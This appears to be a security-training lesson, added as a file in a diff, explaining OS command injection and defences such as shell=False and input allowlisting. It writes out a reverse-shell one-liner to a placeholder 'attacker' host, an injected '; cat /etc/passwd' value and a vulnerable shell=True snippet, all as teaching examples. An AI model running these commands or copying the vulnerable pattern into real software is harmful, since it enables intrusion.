@@ -1,0 +1,110 @@
+---
+id: core-r2-cmd-injection-01
+title: "Command Injection & Secure Process Invocation"
+track: core
+rank: 2
+module: web-security
+order: 29
+estimated_minutes: 30
+objectives_covered: ["secplus:2.2", "secplus:2.5"]
+mitre: ["T1059.004", "T1059.001"]
+xp: 100
+status: draft
+last_reviewed: null
+lab: null
+---
+
+## Briefing
+
+### 1. What it is
+
+**Operating System Command Injection** occurs when an application executes system-level shell commands (using functions like Python's `os.system()`, PHP's `exec()`, or Node.js `child_process.exec()`) and concatenates untrusted user input directly into the command string.
+
+This allows an attacker to inject shell metacharacters (such as `;`, `&&`, `|`, or `$(...)`), altering the command logic and executing arbitrary operating system commands with the privileges of the web application server process.
+
+Think of command injection like a compromised dictation assistant:
+- You instruct the assistant: *"Type a letter to Alice."*
+- If someone yells in the background: *"Alice; and then format the hard drive and shut down the power!"*, and the assistant executes every word literally, the entire system is hijacked.
+
+### 2. Why it matters
+
+Command injection represents one of the highest-severity vulnerabilities in cybersecurity (Critical CVSS 9.8–10.0):
+1. **Immediate Remote Code Execution (RCE):** The attacker gains interactive command-line access directly on the underlying operating system.
+2. **Reverse Shells:** Attackers spawn interactive reverse shells (`nc -e /bin/bash attacker 4444`) to maintain persistent control.
+3. **Lateral Movement:** From the compromised server, attackers scan internal networks, dump configuration files, extract environment variables, and escalate to root.
+
+### 3. How it works
+
+Consider a network ping diagnostic endpoint:
+```python
+# VULNERABLE: Direct shell invocation with string formatting
+cmd = f"ping -c 1 {host}"
+output = subprocess.check_output(cmd, shell=True)
+```
+
+If an attacker supplies `host=8.8.8.8; cat /etc/passwd`, the underlying shell treats the semicolon as a command separator, executing two distinct commands:
+```bash
+ping -c 1 8.8.8.8 ; cat /etc/passwd
+```
+The ping completes, and the contents of `/etc/passwd` are returned on the web page.
+
+#### Dangerous Shell Metacharacters
+- `;`: Sequential execution (runs command 2 after command 1).
+- `&&`: Conditional AND (runs command 2 only if command 1 succeeds).
+- `||`: Conditional OR (runs command 2 only if command 1 fails).
+- `|`: Pipe output from command 1 into command 2.
+- `$(...)` or `` `...` ``: Command substitution.
+- `\n` (Newline `%0a`): Command delimiter in Unix shells.
+
+### 4. Real incident
+
+In 2021, critical zero-day command injection vulnerabilities in enterprise VPN gateways (such as Pulse Secure and Palo Alto Networks PAN-OS) allowed unauthenticated adversaries to execute arbitrary commands by simply supplying crafted payloads in HTTP headers or URL parameters. In each case, input strings were passed into underlying system interpreters, granting adversaries immediate root command shells inside corporate networks.
+
+### 5. How to defend / mitigate
+
+- **Avoid Shells Completely:** Use native programming language standard libraries rather than spawning external command-line binaries.
+- **Execute Processes Without a Shell (`shell=False`):** Pass executable arguments as a list of strings (`['/bin/ping', '-c', '1', host]`), invoking the OS kernel directly via `execve()` without a shell interpreter.
+- **Strict Input Allowlisting:** Enforce strict regex validation (e.g. `^[a-zA-Z0-9.-]+$`), rejecting any string containing shell metacharacters.
+- **Principle of Least Privilege:** Run application processes under restricted service accounts inside sandboxed containers with read-only root filesystems.
+
+### 6. Commands & syntax
+
+Secure process execution pattern in Python:
+```python
+# SECURE: shell=False with argument array
+import subprocess
+output = subprocess.check_output(['/bin/ping', '-c', '1', host], shell=False)
+```
+
+### 7. Common mistakes
+
+- **Using shell=True with input escaping:** Attempting to sanitize metacharacters with custom regex while still invoking a shell interpreter.
+- **Forgetting newline characters:** Filtering semicolons while failing to block newline characters (`%0a`), which terminate commands in bash.
+- **Running services as root:** Allowing the web server process to run with administrative root privileges, making any command injection instantly catastrophic.
+
+### Remember it like this
+
+> **Command injection occurs when user input meets a shell interpreter. Eliminate the shell: set shell=False and pass arguments as a list of strings.**
+
+### Interview answer
+
+> "Command injection occurs when untrusted user input is passed directly to an operating system shell interpreter, allowing attackers to chain arbitrary system commands using metacharacters like semicolons, pipes, or command substitutions. The primary defense is avoiding shell execution entirely by utilizing native language APIs. When executing external binaries is required, arguments must be passed as an array with shell=False, ensuring the operating system kernel treats inputs strictly as literal argument data via execve() rather than executable shell syntax."
+
+## Terminal Check
+
+<TerminalCheck />
+
+## Lab
+
+This lesson has no standalone lab. Command injection concepts and secure process execution are tested in the web capstone challenge.
+
+## Debrief
+
+**What a professional does here.** Security engineers configure Static Application Security Testing (SAST) tools to flag any usage of `shell=True`, `os.system()`, or `Runtime.getRuntime().exec(String)`, and enforce container security profiles (such as AppArmor and seccomp) that prevent application worker processes from spawning `/bin/sh` or `/bin/bash`.
+
+**Key takeaways**
+
+- Command injection executes arbitrary operating system commands with server privileges.
+- Shell metacharacters (`;`, `&&`, `|`, `$(...)`) chain and substitute commands.
+- Setting shell=False passes arguments directly to the kernel, neutralizing metacharacters.
+- Native language libraries should always be preferred over spawning command-line processes.
